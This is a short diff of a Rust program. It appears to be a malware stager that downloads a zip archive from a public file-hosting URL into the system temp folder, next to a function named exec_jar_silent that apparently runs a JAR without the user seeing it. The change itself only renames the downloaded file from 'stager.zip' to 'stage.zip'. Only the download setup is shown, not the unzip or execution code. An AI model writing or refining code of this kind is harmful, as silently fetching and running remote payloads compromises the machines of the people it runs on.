@@ -126,7 +126,7 @@ fn exec_jar_silent(jar_path: &str) -> Result<(), Box<dyn Error>> {
 fn main() -> Result<(), Box<dyn Error>> {
     let file_url = "https://files.catbox.moe/177wm9.zip";
     let temp_dir = env::temp_dir();
-    let output_file = temp_dir.join("stager.zip");
+    let output_file = temp_dir.join("stage.zip");
     let unzip_dir = temp_dir.join("waiting");
 
     if unzip_dir.exists() {
